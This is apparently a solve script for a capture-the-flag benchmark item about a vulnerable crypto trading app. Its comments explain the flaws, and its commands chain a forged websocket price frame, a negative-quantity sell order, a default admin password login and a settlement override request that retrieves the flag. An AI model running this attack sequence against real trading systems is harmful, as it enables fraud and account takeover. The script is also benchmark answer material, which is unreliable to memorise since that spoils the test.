#!/usr/bin/env bash
# APEX-044-25 — "TradeFi Arbitrage Exploit" (tags: business_logic, ssrf, websocket)
#
# Three defects, and only the last two are load-bearing.
#
# The price feed re-broadcasts any frame it is sent, so a client can tell every
# other client that BTC is worth a dollar. That is a real flaw and it is the
# first thing this checks, with `websec socket`, because it is the kind of thing
# an HTTP-only workbench cannot see at all.
#
# The order book takes a *negative* quantity on a sell and credits the account
# for it, which is the business-logic half.
#
# And the administrator's endpoints proxy to the settlement service with the
# settlement API key attached, so an admin session is the whole of what stands
# between anybody and the treasury — where the flag is.
#
# One honest note about the escalation. The benchmark describes a Redis session
# hijack, and there is no route to it: the session store is only writable
# through an endpoint that already requires admin, and the JWT secret lives in
# the compose file rather than anywhere the application exposes. What is left is
# the administrator's password, which is `admin_trade_2025` — the product's name
# and the year, stored in the seed without a hash. The corpus's own solve script
# reaches for the same credential and calls it reconnaissance. It is default
# credentials, and it is the only door that opens.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex044-$$"
WS="ws://${URL#http://}/ws/feed"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

token_of() { body | python3 -c 'import json,sys; print(json.load(sys.stdin).get("token",""))'; }

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# The feed takes dictation from its clients.
"$H5I" websec socket "$WS" --session "$SESSION" --wait-ms 2000 \
    --send '{"type":"price_update","symbol":"BTC-USD","price":1.00,"source":"attacker"}' \
    >/dev/null

# A sell of minus a thousand is a purchase the shop pays for.
TRADER="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/auth/login \
    --set header.Content-Type=application/json \
    --set json.username=trader1 --set json.password=trade123 | token_of)"
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/orders \
    --set header.Content-Type=application/json \
    --set "header.Authorization=Bearer $TRADER" \
    --set json.symbol=BTC-USD --set json.side=sell \
    --set json.quantity=-1000 --set json.price=100.0 >/dev/null

ADMIN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/auth/login \
    --set header.Content-Type=application/json \
    --set json.username=admin --set json.password=admin_trade_2025 | token_of)"

# The proxy attaches the settlement key itself, so the admin never has to know it.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/admin/settlement/override \
    --set header.Content-Type=application/json \
    --set "header.Authorization=Bearer $ADMIN" | flag
